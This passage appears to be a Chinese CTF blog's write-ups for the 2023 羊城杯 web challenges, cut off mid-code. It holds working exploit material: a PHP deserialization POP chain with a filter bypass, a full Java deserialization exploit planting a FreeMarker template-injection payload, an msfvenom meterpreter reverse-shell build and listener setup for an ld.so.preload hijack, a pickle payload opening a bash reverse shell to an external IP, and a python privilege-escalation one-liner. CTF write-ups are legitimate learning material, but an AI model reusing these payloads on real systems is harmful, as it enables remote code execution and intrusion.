class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2023</title>
    <link href="/2023/09/10/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/"/>
    <url>/2023/09/10/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2023"><a href="#羊城杯2023" class="headerlink" title="羊城杯2023"></a>羊城杯2023</h1><p>没附件，只能看wp了</p><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><p>直接跳转了，一直在玩前端。。。。（主要是扫目录也没扫出hint.zip）</p><p>&#x2F;hint.zip  </p><p>有尊嘟假嘟解密</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/tmp/</span>catcatf1ag.txt</code></pre></div><p>p0p.php有跳转，看php版本想到php源代码泄露</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];    &#125;    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ycb</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;now = <span class="hljs-number">0</span>;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;key = True;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;CTF-&gt;<span class="hljs-title function_ invoke__">ycb</span>()) &#123;            <span class="hljs-variable language_">$this</span>-&gt;fine-&gt;<span class="hljs-title function_ invoke__">YCB1</span>(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prohib</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);&#125;<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">prohib</span>(<span class="hljs-variable">$a</span>));&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>sb了，一直在想两个<code>__get</code>要怎么用，直接赋值就完事了</p><div class="code-wrapper"><pre><code class="hljs xl">$aa=new Bei();$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span>CTF=new Yang(); $<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span>CTF-&gt;<span class="hljs-function"><span class="hljs-title">finish</span>-&gt;</span>finish=<span class="hljs-literal">true</span>;$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span>fine=new Yang();$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fine</span>-&gt;</span>key=<span class="hljs-literal">true</span>;$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span>rce=<span class="hljs-string">&#x27;tac /tmp/catcatf1ag.txt&#x27;</span>;$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span>rce1=<span class="hljs-string">&#x27;tac /tmp/catcatf1ag.txt&#x27;</span>;$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fine</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">finish</span>-&gt;</span>finish=<span class="hljs-literal">true</span>;$<span class="hljs-function"><span class="hljs-title">aa</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fine</span>-&gt;</span>now=array(<span class="hljs-string">&#x27;YCB1&#x27;</span>=&gt;<span class="hljs-string">&#x27;syssystemtem&#x27;</span>);   <span class="hljs-comment">//双写绕过即可</span>$b=serialize($aa);echo $b;</code></pre></div><h2 id="Ez-java"><a href="#Ez-java" class="headerlink" title="Ez_java"></a>Ez_java</h2><p><code>BadAttributeValueExpException::readObject -&gt; Map::toString -&gt; HtmlInvocationHandler::invoke -&gt; HtmlMap::get -&gt; HtmlUploadUtil::uploadfile</code></p><div class="code-wrapper"><pre><code class="hljs oxygene"><span class="hljs-keyword">public</span> HtmlInvocationHandler(Map obj) <span class="hljs-comment">&#123;this.obj = obj&#125;</span><span class="hljs-keyword">public</span> Object invoke(Object proxy, <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span>, <span class="hljs-title function_">Object</span>[] <span class="hljs-title function_">args</span>) <span class="hljs-title function_">throws</span> <span class="hljs-title function_">Throwable</span> <span class="hljs-comment">&#123;</span><span class="hljs-comment">        Object result = this.obj.get(method.getName());</span><span class="hljs-comment">        return result;</span><span class="hljs-comment">&#125;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">get</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-title class_">Object</span> obj = <span class="hljs-title class_">HtmlUploadUtil</span>.<span class="hljs-title function_">uploadfile</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span>);            <span class="hljs-keyword">return</span> obj;        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> var4) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var4);        &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">uploadfile</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> filename, <span class="hljs-built_in">String</span> content</span>) &#123;        <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; !filename.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;.ftl&quot;</span>)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-title class_">String</span> realPath = <span class="hljs-string">&quot;/app/templates/&quot;</span> + filename;            <span class="hljs-keyword">if</span> (!realPath.<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;../&quot;</span>) &amp;&amp; !realPath.<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;..\\&quot;</span>)) &#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-title class_">BufferedWriter</span> writer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(realPath));                    writer.<span class="hljs-title function_">write</span>(content);                    writer.<span class="hljs-title function_">close</span>();                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;                &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> var4) &#123;                    <span class="hljs-title class_">System</span>.<span class="hljs-property">err</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;Error uploading file: &quot;</span> + var4.<span class="hljs-title function_">getMessage</span>());                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;                &#125;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;        &#125;&#125;</code></pre></div><p>上传的文件必须是<code>.ftl</code>后缀结尾的文件</p><p>HtmlMap中存在<code>freemaker</code>模板注入，能够上传覆盖<code>index.ftl</code>文件</p><div class="code-wrapper"><pre><code class="hljs processing">#author Boogipop<span class="hljs-keyword">package</span> com.<span class="hljs-property">ycbjava</span>;<span class="hljs-keyword">import</span> com.<span class="hljs-property">ycbjava</span>.<span class="hljs-property">Utils</span>.<span class="hljs-property">HtmlInvocationHandler</span>;<span class="hljs-keyword">import</span> com.<span class="hljs-property">ycbjava</span>.<span class="hljs-property">Utils</span>.*;<span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">ByteArrayInputStream</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">ByteArrayOutputStream</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">ObjectInputStream</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">ObjectOutputStream</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Constructor</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Field</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">InvocationHandler</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Proxy</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">Base64</span>;<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">Map</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-built_in">String</span>[] args) <span class="hljs-keyword">throws</span> Exception &#123;        HtmlMap htmlMap = <span class="hljs-keyword">new </span><span class="hljs-class title_">HtmlMap</span>();        <span class="hljs-title function_">setFieldValue</span>(htmlMap,<span class="hljs-string">&quot;content&quot;</span>,<span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +                <span class="hljs-string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +                <span class="hljs-string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +                <span class="hljs-string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>);        <span class="hljs-title function_">setFieldValue</span>(htmlMap,<span class="hljs-string">&quot;filename&quot;</span>,<span class="hljs-string">&quot;index.ftl&quot;</span>);        Class c = Class.<span class="hljs-property">forName</span>(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);        Constructor annotationconstructor = c.<span class="hljs-property">getDeclaredConstructor</span>(Class.<span class="hljs-property">class</span>, Map.<span class="hljs-property">class</span>);        annotationconstructor.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);        HtmlInvocationHandler htmlInvocationHandler = <span class="hljs-keyword">new </span><span class="hljs-class title_">HtmlInvocationHandler</span>(htmlMap);        <span class="hljs-comment">//生成动态代理</span>        Map mapproxy= (Map) Proxy.<span class="hljs-property">newProxyInstance</span>(HtmlMap.<span class="hljs-property">class</span>.<span class="hljs-property">getClassLoader</span>(),<span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;Map.<span class="hljs-property">class</span>&#125;,htmlInvocationHandler);        <span class="hljs-comment">//生成最外层</span>        <span class="hljs-built_in">Object</span> o = annotationconstructor.<span class="hljs-property">newInstance</span>(Override.<span class="hljs-property">class</span>, mapproxy);        <span class="hljs-comment">//deserTester(o);</span>        System.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-title function_">base64serial</span>(o));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span>(<span class="hljs-keyword">final</span> <span class="hljs-built_in">Object</span> obj, <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> fieldName, <span class="hljs-keyword">final</span> <span class="hljs-built_in">Object</span> value) <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">final</span> Field field = <span class="hljs-title function_">getField</span>(obj.<span class="hljs-property">getClass</span>(), fieldName);        field.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);        <span class="hljs-keyword">if</span>(field != <span class="hljs-literal">null</span>) &#123;            field.<span class="hljs-property">set</span>(obj, value);        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span>(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> fieldName) &#123;        Field field = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            field = clazz.<span class="hljs-property">getDeclaredField</span>(fieldName);            field.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);        &#125; <span class="hljs-title function_">catch</span> (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.<span class="hljs-property">getSuperclass</span>() != <span class="hljs-literal">null</span>)                field = <span class="hljs-title function_">getField</span>(clazz.<span class="hljs-property">getSuperclass</span>(), fieldName);        &#125;        <span class="hljs-keyword">return</span> field;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserTester</span>(<span class="hljs-built_in">Object</span> o) <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-title function_">base64deserial</span>(<span class="hljs-title function_">base64serial</span>(o));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">String</span> <span class="hljs-title function_">base64serial</span>(<span class="hljs-built_in">Object</span> o) <span class="hljs-keyword">throws</span> Exception &#123;        ByteArrayOutputStream baos = <span class="hljs-keyword">new </span><span class="hljs-class title_">ByteArrayOutputStream</span>();        ObjectOutputStream oos = <span class="hljs-keyword">new </span><span class="hljs-class title_">ObjectOutputStream</span>(baos);        oos.<span class="hljs-property">writeObject</span>(o);        oos.<span class="hljs-property">close</span>();        <span class="hljs-built_in">String</span> base64String = Base64.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(baos.<span class="hljs-property">toByteArray</span>());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">base64deserial</span>(<span class="hljs-built_in">String</span> data) <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.<span class="hljs-property">getDecoder</span>().<span class="hljs-property">decode</span>(data);        ByteArrayInputStream bais = <span class="hljs-keyword">new </span><span class="hljs-class title_">ByteArrayInputStream</span>(base64decodedBytes);        ObjectInputStream ois = <span class="hljs-keyword">new </span><span class="hljs-class title_">ObjectInputStream</span>(bais);        ois.<span class="hljs-property">readObject</span>();        ois.<span class="hljs-property">close</span>();    &#125;&#125;</code></pre></div><p>CC1后半的动态代理触发htmlinvocationhanddler。然后就是get写文件覆盖index.ftl，payload参考<a href="https://www.cnblogs.com/escape-w/p/17326592.html">https://www.cnblogs.com/escape-w/p/17326592.html</a></p><p>唉，boogipop太强了</p><h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h2><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123224101954.png" alt="image-20231123224101954"></p><p>上传的文件其实是到了&#x2F;etc目录下，于是可以用<code>LD_PRRLOAD</code>环境变量的配置文件<code>ld.so.preload</code>进行劫持</p><blockquote><p>Linux 操作系统的动态链接库在加载过程中，动态链接器会先读取 LD_PRELOAD 环境变量和默认配置文件 <code>/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD 环境变量和 <code>/etc/ld.so.preload</code> 配置文件中指定的动态链接库依然会被装载，因为它们的优先级比 LD_LIBRARY_PATH 环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入</p></blockquote><p>用msf生成木马</p><div class="code-wrapper"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=vps的ip <span class="hljs-attribute">LPORT</span>=1000 -f elf-so -o evil.elf</code></pre></div><p>在自己vps 起msfconsole</p><div class="code-wrapper"><pre><code class="hljs awk">use payload<span class="hljs-regexp">/linux/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp <span class="hljs-comment">#展示相关信息</span>show options<span class="hljs-comment">#设置反弹接受shell的主机ip 这里设置成本机</span>set lhost <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-comment">#监听ip 这里当时生成木马时端口是多少 就要设置成多少</span>set lport <span class="hljs-number">1000</span><span class="hljs-comment">#开始执行利用</span>exploit</code></pre></div><p>进行监听</p><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123224527481.png" alt="image-20231123224527481"></p><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123224535913.png" alt="image-20231123224535913"></p><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123224544680.png" alt="image-20231123224544680"></p><p>然后msf执行任意命令即可劫持  （不懂没了解过）</p><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123224630120.png" alt="image-20231123224630120"></p><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p><a href="http://www.zip泄露/">www.zip泄露</a></p><div class="code-wrapper"><pre><code class="hljs kotlin">from flask <span class="hljs-keyword">import</span> Flask, session<span class="hljs-keyword">import</span> base64<span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/verification&#x27;</span>)def verification():    <span class="hljs-keyword">try</span>:        attribute = session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;Attribute&#x27;</span>)        <span class="hljs-keyword">if</span> not isinstance(attribute, dict):            raise Exception    except Exception:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hacker!!!&#x27;</span>    <span class="hljs-keyword">if</span> attribute.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:        <span class="hljs-keyword">if</span> attribute.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:            <span class="hljs-keyword">return</span> secret        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Don&#x27;t play tricks on me&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are a perfect stranger to me&quot;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)</code></pre></div><p>解密session，发现secret_key，然后伪造成admin</p><p><code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;GWHT&#39;, &#39;secret_key&#39;: &#39;GWHTESEeGQMqmz&#39;&#125;&#125;</code></p><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/src0de&#x27;</span>)def <span class="hljs-built_in">src0de</span>():    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)    rsp = f.<span class="hljs-built_in">read</span>()    f.<span class="hljs-built_in">close</span>()    return rsp[rsp.<span class="hljs-built_in">index</span>(<span class="hljs-string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]<span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/ppppppppppick1e&#x27;</span>)def <span class="hljs-built_in">ppppppppppick1e</span>():    <span class="hljs-attribute">try</span>:        username = <span class="hljs-string">&quot;admin&quot;</span>        rsp = <span class="hljs-built_in">make_response</span>(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span>        pick1e = request.cookies.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;pick1e&#x27;</span>)        if pick1e is <span class="hljs-keyword">not</span> <span class="hljs-attribute">None</span>:            pick1e = base64.<span class="hljs-built_in">b64decode</span>(pick1e)        <span class="hljs-attribute">else</span>:            return rsp        if <span class="hljs-built_in">check</span>(pick1e):            pick1e = pickle.<span class="hljs-built_in">loads</span>(pick1e)            return <span class="hljs-string">&quot;Go for it!!!&quot;</span>        <span class="hljs-attribute">else</span>:            return <span class="hljs-string">&quot;No Way!!!&quot;</span>    except Exception as <span class="hljs-attribute">e</span>:        error_message = <span class="hljs-built_in">str</span>(e)        return error_message    return rspclass <span class="hljs-built_in">GWHT</span>():    def <span class="hljs-built_in">__init__</span>(self):        passif __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.<span class="hljs-built_in">run</span>(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)</code></pre></div><p>按照大佬们的说法，经过测试发现过滤R指令</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<span class="hljs-keyword">import</span> base64opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><span class="hljs-string">system</span><span class="hljs-string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&quot;&#x27;</span><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><span class="hljs-built_in">print</span>(base64.b64encode(opcode)</code></pre></div><p>反弹成功后，权限不够，进行提权，python3.8能够提权</p><div class="code-wrapper"><pre><code class="hljs csp">python3.8 -c &quot;import os;os.execl(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-p&#x27;</span>)&quot;</code></pre></div><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><p>都是非预期</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/read?file=/</span>proc<span class="hljs-regexp">/1/</span>environ</code></pre></div><p>预期</p><ol><li>从内存中通过偏移量读取secretkey 伪造session  （&#x2F;proc&#x2F;self&#x2F;maps     &#x2F;proc&#x2F;self&#x2F;mem）</li><li>python黑魔法去污染os.path.pardir     (变量覆盖，修改os.path.pardir不为<code>..</code>即可目录穿越)</li><li>路径穿越读flag</li></ol><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 创建 Flask 应用实例</span>app = Flask(__name__)<span class="hljs-comment"># 定义 WAF（Web Application Firewall）函数，用于检查输入是否包含恶意关键词</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):    flag = <span class="hljs-literal">True</span>    blacklist = [<span class="hljs-string">&#x27;bytes&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;frozenset&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;tuple&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;listitems&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;apply&#x27;</span>]    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(s).lower():            flag = <span class="hljs-literal">False</span>            <span class="hljs-built_in">print</span>(no)            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">return</span> flag<span class="hljs-comment"># 定义提取文件的函数</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFile</span>(<span class="hljs-params">filepath, <span class="hljs-built_in">type</span></span>):    extractdir = filepath.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractdir):        os.makedirs(extractdir)    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;tar&#x27;</span>:        tf = tarfile.TarFile(filepath)        tf.extractall(extractdir)        <span class="hljs-keyword">return</span> tf.getnames()<span class="hljs-comment"># 定义根路由和视图函数，用于显示主页</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():    fn = <span class="hljs-string">&#x27;uploads/&#x27;</span> + md5().hexdigest()    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fn):        os.makedirs(fn)    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<span class="hljs-comment"># 定义上传文件的路由和视图函数</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span 